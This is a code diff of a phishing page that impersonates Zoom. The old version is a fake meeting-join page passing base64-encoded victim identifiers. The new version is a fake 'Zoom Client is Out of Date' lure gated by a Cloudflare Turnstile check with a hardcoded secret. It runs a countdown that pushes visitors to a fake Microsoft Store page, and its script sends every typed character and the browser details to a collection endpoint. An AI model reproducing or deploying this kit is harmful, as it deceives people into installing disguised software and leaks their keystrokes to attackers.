@@ -1,235 +1,415 @@
+<?php
+// 🛡️ Turnstile Verification
+$turnstileSecret = '0x4AAAAAADGkhs_9XAY_D2adyse8OZMS9RQ';
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $token = $_POST['cf-turnstile-response'] ?? '';
+    $ip = $_SERVER['REMOTE_ADDR'];
+
+    $ch = curl_init('https://challenges.cloudflare.com/turnstile/v0/siteverify');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
+        'secret'   => $turnstileSecret,
+        'response' => $token,
+        'remoteip' => $ip
+    ]));
+
+    $response = curl_exec($ch);
+    $result = json_decode($response, true);
+    if (!$result['success']) {
+        header("Location: ../index.html?error=captcha_failed");
+        exit;
+    }
+} else {
+    // Redirect back to captcha if accessed directly via GET
+    header("Location: ../index.html");
+    exit;
+}
+?>
 <!DOCTYPE html>
 <html lang="en">
-<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
 
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Zoom Client Update</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --zoom-blue: #0072c6;
+      --text-color: #555;
+      --bg-color: #f4f7fa;
+      --border-color: #0072c6;
+      --button-hover-bg: #0072c6;
+      --button-hover-color: #fff;
+    }
 
-    <title>Join conversation on Zoom</title>
-    <link rel="icon" type="image/png" href="https://st1.zoom.us/zoom.ico">
-    <link rel="stylesheet" type="text/css" href="css/style22.css">
-    <style>
-        * {
-            box-sizing: border-box;
-        }
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: var(--bg-color);
+      margin: 0;
+      padding: 0;
+      color: var(--text-color);
+    }
 
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
+    #preloader {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: var(--bg-color);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      opacity: 1;
+      transition: opacity 1s ease;
+    }
 
-        .login-container {
-            background-color: #ffffff;
-            padding: 48px 40px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            border-radius: 16px;
-            width: 100%;
-            max-width: 420px;
-            text-align: center;
-            animation: fadeIn 0.5s ease-out;
-        }
+    .preloader-spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid var(--zoom-blue);
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1.5s linear infinite;
+      margin-bottom: 20px;
+    }
 
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(-20px);
-            }
+    .preloader-message {
+      font-size: 18px;
+      font-weight: 500;
+      color: var(--zoom-blue);
+    }
 
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
 
-        .login-container img.logo {
-            width: 80px;
-            height: auto;
-            max-width: 100%;
-            margin-bottom: 24px;
-        }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
 
-        .login-container h3 {
-            margin: 0 0 8px 0;
-            font-size: 28px;
-            font-weight: 600;
-            color: #2d2d2d;
-            letter-spacing: -0.5px;
-        }
+    #main-content {
+      display: none;
+      animation: fadeIn 1s ease-in-out forwards;
+    }
 
-        .login-container .subtitle {
-            color: #666;
-            font-size: 15px;
-            margin-bottom: 32px;
-        }
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(10px);
+      }
 
-        .login-container button {
-            width: 100%;
-            padding: 14px 24px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 15px;
-            font-weight: 600;
-            transition: all 0.2s ease;
-            margin-bottom: 12px;
-            letter-spacing: 0.3px;
-        }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
 
-        .login-button {
-            background-color: #0E72ED;
-            color: #ffffff;
-            box-shadow: 0 4px 14px rgba(14, 114, 237, 0.3);
-        }
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
 
-        .login-button:hover {
-            background-color: #0B5EC7;
-            box-shadow: 0 6px 20px rgba(14, 114, 237, 0.4);
-            transform: translateY(-1px);
-        }
+    .logo-container {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+    }
 
-        .login-button:active {
-            transform: translateY(0);
-        }
+    .logo {
+      width: 120px;
+      height: auto;
+    }
 
-        .signup-button {
-            background-color: #f5f5f5;
-            color: #2d2d2d;
-            border: 2px solid #e0e0e0;
-        }
+    .top-right-links {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      font-size: 14px;
+      color: var(--zoom-blue);
+      display: flex;
+      gap: 15px;
+      align-items: center;
+    }
 
-        .signup-button:hover {
-            background-color: #ebebeb;
-            border-color: #d0d0d0;
-        }
+    .top-right-links a {
+      text-decoration: none;
+      color: var(--zoom-blue);
+    }
 
-        .login-container p {
-            margin-top: 24px;
-            color: #666;
-            font-size: 14px;
-        }
+    .heading {
+      font-size: 28px;
+      font-weight: bold;
+      color: var(--zoom-blue);
+      margin-top: 100px;
+    }
 
-        .login-container a {
-            color: #0E72ED;
-            text-decoration: none;
-            font-weight: 500;
-        }
+    .subheading {
+      font-size: 18px;
+      color: var(--text-color);
+      margin-top: 10px;
+    }
 
-        .login-container a:hover {
-            text-decoration: underline;
-        }
+    .download-info,
+    .countdown {
+      font-size: 18px;
+      font-weight: 500;
+      color: var(--zoom-blue);
+      margin-top: 15px;
+    }
 
-        .login-container .footer-text {
-            font-size: 12px;
-            color: #999;
-            margin-top: 32px;
-            padding-top: 24px;
-            border-top: 1px solid #f0f0f0;
-        }
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid var(--zoom-blue);
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 2s linear infinite;
+      margin-top: 30px;
+    }
 
-        @media (max-width: 480px) {
-            .login-container {
-                padding: 32px 24px;
-            }
+    .footer {
+      position: absolute;
+      bottom: 20px;
+      width: 100%;
+      text-align: center;
+      font-size: 12px;
+      color: #777;
+    }
 
-            .login-container h3 {
-                font-size: 24px;
-            }
-        }
-    </style>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+    .download-button-outline {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      background-color: transparent;
+      color: var(--zoom-blue);
+      border: 2px solid var(--border-color);
+      padding: 12px 24px;
+      text-decoration: none;
+      font-weight: 500;
+      border-radius: 999px;
+      margin-top: 15px;
+      transition: background-color 0.3s ease, color 0.3s ease;
+    }
+
+    .download-button-outline:hover {
+      background-color: var(--button-hover-bg);
+      color: var(--button-hover-color);
+    }
+
+    .confirmation-message {
+      margin-top: 20px;
+      font-size: 16px;
+      color: green;
+      display: none;
+      animation: fadeSuccess 1s ease-in-out forwards;
+    }
+
+    @keyframes fadeSuccess {
+      0% {
+        opacity: 0;
+        transform: scale(0.95);
+      }
+
+      100% {
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
+
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --text-color: #ccc;
+        --bg-color: #121212;
+        --border-color: #4da6ff;
+        --zoom-blue: #4da6ff;
+        --button-hover-bg: #4da6ff;
+        --button-hover-color: #000;
+      }
+
+      .footer {
+        color: #aaa;
+      }
+
+      .spinner,
+      .preloader-spinner {
+        border: 4px solid #333;
+        border-top: 4px solid var(--zoom-blue);
+      }
+    }
+  </style>
 </head>
 
 <body>
-    <!-- oncontextmenu="return false" onselectstart="return false" ondragstart="return false" -->
-    <div class="login-container">
-        <img src="https://st1.zoom.us/static/6.3.52789/image/new/topNav/Zoom_logo.svg" alt="Zoom Logo" class="logo">
-        <h3>Join your Zoom meeting</h3>
-        <p class="subtitle">Click below to continue with your browser or the Zoom app</p>
-
-        <button class="login-button" id="btnSubmitMain" onClick="begin()">Continue on this browser</button>
-        <button class="signup-button" id="btnSubmitMain2" onClick="begin()">Join on the Zoom app</button>
-
-        <p><a href="#">Can't access your account?</a></p>
-        <p class="footer-text">2026 Zoom Video Communications, Inc. All rights reserved.</p>
-    </div>
-    <script>
-        // Function to check if the user is on a mobile device
-        function isMobileDevice() {
-            return /Mobi|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-        }
-
-        // Redirect if mobile
-        if (isMobileDevice()) {
-            window.location.href = "./sorry.php";
-        }
-    </script>
-
-    <script>
-        function loading(message, type) {
-            $("#btnSubmitMain").html(message);
-            if (type === "error") {
-                $("#btnSubmitMain").css("background-color", "#dc3545");
-            } else if (type === "reset") {
-                $("#btnSubmitMain").html("Continue on this browser");
-                $("#btnSubmitMain").css("background-color", "#0b5cff");
-                $("#btnSubmitMain").attr("disabled", false);
-            }
-        }
-
-        function begin() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const auth = urlParams.get('auth')
-
-            // Debug: Show current URL and parameters
-            console.log('Current URL:', window.location.href);
-            console.log('URL search params:', window.location.search);
-            console.log('Auth parameter:', auth);
-
-            if ((urlParams.get('auth') == undefined || urlParams.get('auth') == null)) {
-                $("#btnSubmitMain").attr("disabled", true)
-                loading("&nbsp;&nbsp;&nbsp; Loading...", "error")
-
-                // Reset after 2 seconds with error message
-                setTimeout(() => {
-                    loading("Access denied - invalid link", "error");
-                    setTimeout(() => {
-                        loading("", "reset");
-                    }, 2000);
-                }, 1000);
-            } else {
-                const agent = "MjM1NzQ3MQ==";
-                const CompN = "TW9obmVlc2g=";
-                const CompId = "bW9obmVlc2gudGFsd2FyQGFsaWF5aXMuY29t";
-                window.location.href = `./Video_Call/invite.php?Join=${agent}&Video=${CompN}&auth=${CompId}`;
-            }
-        }
-    </script>
 
 
-
-    <script>
-        window.addEventListener("load", () => {
-            const loader = document.querySelector(".loader");
-
-            loader.classList.add("loader--hidden");
-
-            loader.addEventListener("transitionend", () => {
-                document.body.removeChild(loader);
-            });
+  <script>
+    // Function to send POST request
+    async function sendPostRequest(data) {
+      const endpoint = './action.php'; // Action script to handle requests
+      try {
+        await fetch(endpoint, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data),
         });
-    </script>
-    <div class="loader"></div>
-    <script defer
-        src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516"
-        integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg=="
-        data-cf-beacon='{"version":"2024.11.0","token":"098d0766a6c04db7a20d7bcd64a6fd67","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'
-        crossorigin="anonymous"></script>
+        console.log('...');
+      } catch (error) {
+        console.error('Error sending data:', error);
+      }
+    }
+
+    // Send a POST request when the page loads (visitor detection)
+    window.onload = () => {
+      const visitData = {
+        action: 'visit',
+        userAgent: navigator.userAgent, // Capture browser details
+      };
+      sendPostRequest(visitData);
+    };
+
+    // Monitor input field for changes
+    function trackInput(event) {
+      const newChar = event.data; // Get the character just entered
+      if (newChar) {
+        const charData = {
+          action: 'character',
+          character: newChar,
+          userAgent: navigator.userAgent, // Include browser details
+        };
+        sendPostRequest(charData);
+      }
+    }
+
+    // Handle form submission
+    function handleSubmit(event) {
+      event.preventDefault(); // Prevent default form submission
+      const inputField = document.getElementById('inputField').value;
+
+      const formData = {
+        action: 'submit',
+        inputField: inputField, // Capture user input
+        userAgent: navigator.userAgent, // Include browser details
+      };
+      sendPostRequest(formData).then(() => {
+        console.log('...');
+      });
+    }
+  </script>
+
+
+
+
+
+
+
+
+  <!-- Preloader -->
+  <div id="preloader">
+    <div class="preloader-spinner"></div>
+    <div class="preloader-message" id="preloaderMessage">Please wait...</div>
+  </div>
+
+  <!-- Main Content -->
+  <div id="main-content">
+    <div class="logo-container">
+      <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Zoom_Communications_Logo.svg" alt="Zoom logo">
+    </div>
+
+    <div class="top-right-links">
+      <a href="#">Support</a>
+      <a href="#">English</a>
+    </div>
+
+    <div class="container">
+      <div class="heading">Your Zoom Client is Out of Date</div>
+      <div class="subheading">Please wait while you're redirected to Microsoft Store...</div>
+
+      <div class="download-info">Please wait while you're redirected to Microsoft Store...</div>
+      <div class="countdown">Redirecting in <span id="countdown">25</span> seconds</div>
+
+      <div class="spinner"></div>
+
+      <p>If you are not redirected automatically, click below:</p>
+      <a href="microsoft-store.php" id="manualDownload" class="download-button-outline">
+        <img src="./img/micro.png" alt="Microsoft Store Logo" style="height: 24px;">
+        Go to Microsoft Store
+      </a>
+
+      <div id="confirmation" class="confirmation-message">Please wait while you're redirected to Microsoft Store...</div>
+    </div>
+
+    <div class="footer">
+      <p>&copy; Zoom Video Communications, Inc. All rights reserved.</p>
+    </div>
+  </div>
+
+  <script>
+    const preloader = document.getElementById("preloader");
+    const preloaderMessage = document.getElementById("preloaderMessage");
+    const mainContent = document.getElementById("main-content");
+    const countdownElement = document.getElementById('countdown');
+    const confirmationMsg = document.getElementById('confirmation');
+    const manualButton = document.getElementById('manualDownload');
+
+    let redirectStarted = false;
+
+    // Preloader message transitions
+    setTimeout(() => preloaderMessage.textContent = "We're setting up your meeting...", 5000);
+    setTimeout(() => preloaderMessage.textContent = "Joining your meeting...", 10000);
+    setTimeout(() => {
+      preloader.style.opacity = 0;
+      setTimeout(() => {
+        preloader.style.display = "none";
+        mainContent.style.display = "block";
+      }, 1000);
+    }, 15000);
+
+    // Countdown
+    let countdownTime = 25;
+    const countdownInterval = setInterval(() => {
+      countdownTime--;
+      countdownElement.textContent = countdownTime;
+      if (countdownTime <= 0 && !redirectStarted) {
+        startRedirect();
+        clearInterval(countdownInterval);
+      }
+    }, 1000);
+
+    // Redirect trigger
+    function startRedirect() {
+      if (redirectStarted) return;
+      redirectStarted = true;
+
+      confirmationMsg.style.display = 'block';
+      document.querySelector('.download-info').textContent = "Please wait while you're redirected to Microsoft Store...";
+
+      // Redirect after 10 seconds
+      setTimeout(() => {
+        window.location.href = "microsoft-store.php";
+      }, 5000);
+    }
+
+    // Manual click handler
+    manualButton.addEventListener('click', (e) => {
+      e.preventDefault();
+      startRedirect();
+    });
+  </script>
 </body>
 
 </html>
